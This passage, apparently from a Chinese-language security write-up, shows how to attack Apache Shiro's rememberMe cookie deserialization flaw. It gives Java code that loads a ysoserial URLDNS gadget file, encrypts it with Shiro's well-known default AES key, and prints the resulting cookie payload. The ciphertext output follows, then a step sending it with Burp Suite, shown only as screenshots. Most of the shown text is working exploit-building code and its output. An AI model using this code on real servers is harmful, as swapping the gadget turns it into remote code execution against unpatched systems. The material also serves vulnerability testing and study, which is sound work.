import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.nio.file.FileSystems;
import java.nio.file.Files;

public class Test {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("/Users/liujianping/Desktop/Tools/ysoserial-master/URLDNS.ser"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());
    }
}

```  
  
执行结果：  
```
9vhmAzz5v5iJ3TfZvG8VAiaUL5fQuhWZCMF4BOBuOKmATr82KW6mEYQCg5qX1NRJIbYpGm45SYZ3QZeJDqUf+MFGwS3XJq7PBUDkD/P8MUG1PfHdL4m5PlZkbiRllLkVYJgi9hdkJkON4JQu1FU/NQ==
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuYSsqFib6AWSibmZQyzG14ORgrjfY01gKhYbUEQtD1ICWp9A9dxLwEtOA/640?wx_fmt=png&from=appmsg "")  
  
4）burpsuite发包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuWFuwRMaZL01kN2d1x2zoOb1wLLrBlTSOsJmrUq9PO0MQibWoLeoJQuA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuO2MVw5yEia4J4nFsian66BmDgODiaMibWrxsOkpNqGwpUbf3X5xiarrKMzA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
  
​​​​​  
  
​​​​​  
  
​​​​​  
  
